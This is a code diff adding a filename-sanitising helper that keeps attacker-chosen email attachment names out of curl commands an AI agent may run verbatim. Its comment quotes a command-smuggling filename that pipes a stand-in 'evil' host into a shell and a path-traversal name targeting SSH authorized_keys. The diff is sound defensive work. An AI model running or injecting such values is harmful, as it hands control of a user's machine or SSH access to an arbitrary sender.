@@ -127,3 +127,18 @@ export const formatSize = (bytes: number): string => {
   }
   return `${(bytes / (1024 * 1024)).toFixed(1)} MB`
 }
+
+// Characters that could break out of a single-quoted curl example or steer
+// the write path: quotes, backslashes, path separators, controls, and format
+// characters (a right-to-left override or zero-width space disguises a name).
+const SHELL_UNSAFE_RE = /[\p{Cc}\p{Cf}'"\\/]/gu
+const LEADING_DOTS_RE = /^\.+/u
+
+// The curl examples in the download tools are text an agent may run
+// verbatim, and the filename comes from the incoming email — i.e. from an
+// arbitrary sender. A name like `x'; curl evil | sh; '` or
+// `../../.ssh/authorized_keys` must not survive into the suggested command.
+export const shellSafeFilename = (name: string, fallback: string): string => {
+  const cleaned = name.replaceAll(SHELL_UNSAFE_RE, '_').trim().replace(LEADING_DOTS_RE, '').trim()
+  return cleaned || fallback
+}
